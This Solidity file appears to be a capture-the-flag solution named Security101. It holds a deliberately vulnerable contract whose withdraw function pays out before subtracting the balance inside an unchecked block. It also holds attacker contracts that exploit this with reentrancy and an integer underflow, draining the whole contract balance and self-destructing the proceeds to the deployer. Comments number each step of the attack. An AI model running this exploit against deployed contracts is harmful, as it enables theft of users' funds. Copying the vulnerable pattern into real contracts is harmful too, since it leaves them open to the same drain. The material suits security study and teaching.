// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract OptimizedAttackerSecurity101 {
    constructor(Security101 _victimToken) payable {
        (new Attacker{value: msg.value}()).attack(_victimToken);

        // 7. Although contract doesn't have any balance but destructing to get some gas refund.
        selfdestruct(payable(msg.sender));
    }
}

contract Attacker {
    constructor() payable {}

    function attack(Security101 _victimToken) external payable {
        _victimToken.deposit{value: 1 ether}(); // 1. Depositing 1 eth
        _victimToken.withdraw(1); // 2. Withdrawing 1 wei
        _victimToken.withdraw(address(_victimToken).balance); // 5. Now we can withdraw entire balance of Security101 contract

        // 6. Sending funds to the deployer of OptimizedAttackerSecurity101 contract and getting some gas back
        selfdestruct(payable(tx.origin));
    }

    receive() external payable {
        if (address(this).balance != 1 wei) return; // 3. First time it's called balance would be 1 wei, would return when receive is called again

        // 4. Using re-entrancy, withdrawing 1 eth again, this call would make our balance 0 ( 1 eth - 1 eth = 0 )in Security101 contract,
        //    then call of "2" step would continue which would result in an underflow (0 - 1 wei = type(uint256).max)
        Security101(msg.sender).withdraw(1 ether);
    }
}
